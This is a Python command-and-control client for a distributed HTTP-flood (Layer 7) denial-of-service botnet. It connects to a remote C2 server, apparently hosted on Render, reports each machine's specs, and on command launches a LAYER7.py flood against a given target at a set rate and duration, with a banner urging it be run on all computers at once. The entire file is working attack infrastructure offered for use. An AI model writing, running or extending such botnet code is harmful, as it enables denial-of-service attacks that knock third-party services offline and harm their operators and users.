#!/usr/bin/env python3
"""
C2 Client - Runs LAYER7.py when commanded by server
Connects to C2 server and executes attacks simultaneously
"""
import socketio
import json
import time
import threading
import sys
import os
import platform
import psutil
import subprocess
import tempfile
from datetime import datetime

# Try to import actual LAYER7.py
try:
    import LAYER7
    HAS_LAYER7 = True
except ImportError:
    HAS_LAYER7 = False
    print("[!] LAYER7.py not found, using simulation mode")

class Layer7Client:
    """Client that runs LAYER7.py attacks"""
    
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        
        # Configure SocketIO client with better settings for Render
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,  # Infinite retries
            reconnection_delay=1,
            reconnection_delay_max=5,
            logger=False,
            engineio_logger=False
        )
        
        self.current_attack = None
        self.running = False
        self.attack_thread = None
        
        # Setup event handlers
        self.setup_handlers()
        
        # Client info
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'python_version': platform.python_version(),
            'has_layer7': HAS_LAYER7
        }
    
    def setup_handlers(self):
        """Setup SocketIO event handlers"""
        @self.sio.event
        def connect():
            print(f"✅ Connected to C2 Server: {self.server_url}")
            self.register_client()
        
        @self.sio.event
        def connect_error(data):
            print(f"❌ Connection failed: {data}")
            print("💡 Retrying connection...")
        
        @self.sio.event
        def disconnect():
            print("❌ Disconnected from server")
            print("🔄 Attempting to reconnect...")
            self.running = False
        
        @self.sio.event
        def welcome(data):
            print(f"📢 Server: {data['message']}")
        
        @self.sio.event
        def attack_command(data):
            print(f"\n🎯 Received attack command")
            print(f"   Target: {data.get('target')}")
            print(f"   Method: {data.get('method')}")
            print(f"   Duration: {data.get('duration')}s")
            print(f"   RPS: {data.get('rps')}")
            
            if data.get('command') == 'start':
                self.current_attack = data.get('attack_id')
                self.start_attack(data)
            elif data.get('command') == 'stop':
                self.stop_attack()
    
    def register_client(self):
        """Register client with server"""
        try:
            self.sio.emit('client_register', self.client_info)
            print(f"✅ Registered as: {self.client_name}")
        except Exception as e:
            print(f"⚠️ Registration error: {e}")
    
    def start_attack(self, attack_data):
        """Start attack execution"""
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Another attack is already running")
            return
        
        self.running = True
        self.attack_thread = threading.Thread(
            target=self.execute_attack,
            args=(attack_data,),
            daemon=True
        )
        self.attack_thread.start()
        
        # Notify server
        try:
            self.sio.emit('attack_started', {
                'attack_id': attack_data.get('attack_id'),
                'target': attack_data.get('target')
            })
        except Exception as e:
            print(f"⚠️ Failed to notify server: {e}")
    
    def execute_attack(self, attack_data):
        """Execute LAYER7.py attack"""
        attack_id = attack_data.get('attack_id')
        target = attack_data.get('target')
        method = attack_data.get('method', 'http')
        duration = attack_data.get('duration', 60)
        rps = attack_data.get('rps', 100)
        
        try:
            print(f"\n{'='*60}")
            print(f"🚀 EXECUTING LAYER7 ATTACK")
            print(f"   Target: {target}")
            print(f"   Method: {method}")
            print(f"   Duration: {duration}s")
            print(f"   RPS: {rps}")
            print(f"{'='*60}\n")
            
            start_time = time.time()
            
            if HAS_LAYER7:
                results = self.run_actual_layer7(target, method, duration, rps)
            else:
                results = self.run_simulation(target, method, duration, rps)
            
            elapsed = time.time() - start_time
            actual_rps = results.get('requests', 0) / elapsed if elapsed > 0 else 0
            
            # Report completion
            try:
                self.sio.emit('attack_complete', {
                    'attack_id': attack_id,
                    'results': {
                        'requests': results.get('requests', 0),
                        'success': results.get('success_rate', 0),
                        'rps': actual_rps,
                        'duration': elapsed,
                        'method': method
                    }
                })
            except Exception as e:
                print(f"⚠️ Failed to report completion: {e}")
            
            print(f"\n✅ Attack completed in {elapsed:.1f}s")
            print(f"   Requests: {results.get('requests', 0):,}")
            print(f"   RPS: {actual_rps:.1f}")
            print(f"   Success: {results.get('success_rate', 0)}%")
            
        except Exception as e:
            print(f"\n❌ Attack error: {str(e)}")
            try:
                self.sio.emit('attack_error', {
                    'attack_id': attack_id,
                    'error': str(e)
                })
            except:
                pass
        finally:
            self.running = False
            self.current_attack = None
    
    def run_actual_layer7(self, target, method, duration, rps):
        """Run actual LAYER7.py tool"""
        try:
            script = f"""
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import LAYER7

if hasattr(LAYER7, 'main'):
    old_argv = sys.argv
    sys.argv = ['LAYER7.py', '--target', '{target}', '--method', '{method}', 
                '--duration', '{duration}', '--rps', '{rps}']
    try:
        LAYER7.main()
    finally:
        sys.argv = old_argv

elif hasattr(LAYER7, 'NetworkLayerTester'):
    tester = LAYER7.NetworkLayerTester(
        target='{target}',
        target_type='{method}',
        requests_per_second={rps},
        duration={duration}
    )
    tester.execute_enhanced_attack()
    requests = len(tester.results) if hasattr(tester, 'results') else 0
    success = len([r for r in tester.results if r.get('success', False)]) if hasattr(tester, 'results') else 0
    print(f"LAYER7 Results: {{requests}} requests, {{success}} successful")
else:
    print("LAYER7.py structure not recognized")
    print("Available in LAYER7 module:", dir(LAYER7))
"""
            
            result = subprocess.run(
                [sys.executable, '-c', script],
                capture_output=True,
                text=True,
                timeout=duration + 30
            )
            
            output = result.stdout
            
            import re
            numbers = re.findall(r'\d+', output)
            requests = int(numbers[0]) if numbers else rps * duration
            
            return {
                'requests': requests,
                'success_rate': 85
            }
            
        except subprocess.TimeoutExpired:
            return {'requests': rps * duration, 'success_rate': 80}
        except Exception as e:
            print(f"LAYER7 execution error: {e}")
            return self.run_simulation(target, method, duration, rps)
    
    def run_simulation(self, target, method, duration, rps):
        """Simulate attack if LAYER7.py not available"""
        print(f"[SIM] Running simulation attack on {target}")
        print(f"[SIM] Method: {method}, Duration: {duration}s, RPS: {rps}")
        
        total_requests = 0
        start_time = time.time()
        last_progress = 0
        
        while time.time() - start_time < duration and self.running:
            batch_size = min(rps, 1000)
            total_requests += batch_size
            
            elapsed = time.time() - start_time
            if elapsed - last_progress >= 5:
                current_rps = total_requests / elapsed
                try:
                    self.sio.emit('attack_progress', {
                        'requests': total_requests,
                        'rps': current_rps,
                        'elapsed': elapsed
                    })
                except:
                    pass
                print(f"[SIM] Progress: {total_requests:,} requests, {current_rps:.1f} RPS")
                last_progress = elapsed
            
            time.sleep(0.01)
        
        elapsed = time.time() - start_time
        actual_rps = total_requests / elapsed if elapsed > 0 else 0
        
        return {
            'requests': total_requests,
            'success_rate': 92,
            'rps': actual_rps
        }
    
    def stop_attack(self):
        """Stop current attack"""
        self.running = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        self.current_attack = None
        print("🛑 Attack stopped by server")
    
    def report_stats(self):
        """Report statistics to server"""
        while True:
            try:
                if self.sio.connected and not self.running:
                    cpu_usage = psutil.cpu_percent(interval=1)
                    memory_usage = psutil.virtual_memory().percent
                    
                    stats = {
                        'cpu_usage': cpu_usage,
                        'memory_usage': memory_usage,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.sio.emit('client_stats', {'stats': stats})
                
                time.sleep(10)
            except:
                time.sleep(10)
    
    def connect(self):
        """Connect to server and start monitoring"""
        try:
            print("\n" + "="*60)
            print("🤖 LAYER7 Distributed Client")
            print(f"🔗 Connecting to: {self.server_url}")
            print(f"🏷️  Client: {self.client_name}")
            print(f"💻 Platform: {platform.platform()}")
            print(f"⚡ CPUs: {psutil.cpu_count()} cores")
            print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
            print(f"🔧 LAYER7.py: {'✅ Available' if HAS_LAYER7 else '❌ Using simulation'}")
            print("="*60 + "\n")
            
            print("⚡ Connecting...")
            print("📡 This may take 10-30 seconds for Render servers...")
            
            # Try to connect with timeout
            self.sio.connect(
                self.server_url,
                wait_timeout=30,
                transports=['websocket', 'polling']  # Try both transports
            )
            
            print("\n✅ Connection successful!")
            print("📡 Waiting for attack commands from server...")
            print("⚡ Press Ctrl+C to disconnect\n")
            
            # Start stats reporting
            stats_thread = threading.Thread(target=self.report_stats, daemon=True)
            stats_thread.start()
            
            # Keep running
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Client stopped by user")
            self.disconnect()
        except Exception as e:
            print(f"\n❌ Connection error: {str(e)}")
            print("\n💡 Troubleshooting tips:")
            print("   1. Check if server URL is correct")
            print("   2. Make sure server is running (Render may need time to wake up)")
            print("   3. Check your internet connection")
            print("   4. Try again in 30 seconds if server was sleeping")
            self.disconnect()
    
    def disconnect(self):
        """Disconnect from server"""
        self.running = False
        if self.sio.connected:
            try:
                self.sio.disconnect()
            except:
                pass

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║    LAYER7 DISTRIBUTED CLIENT        ║
    ║    Run on ALL computers              ║
    ║    Attacks run simultaneously        ║
    ╚══════════════════════════════════════╝
    """)
    
    default_server = "https://c2-server-io.onrender.com"
    
    server_url = input(f"🌐 C2 Server URL [{default_server}]: ").strip()
    if not server_url:
        server_url = default_server
    
    # Ensure URL has protocol
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    client_name = input(f"🏷️  Client Name [{platform.node()}]: ").strip()
    if not client_name:
        client_name = platform.node()
    
    # Create and run client
    client = Layer7Client(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":
    main()
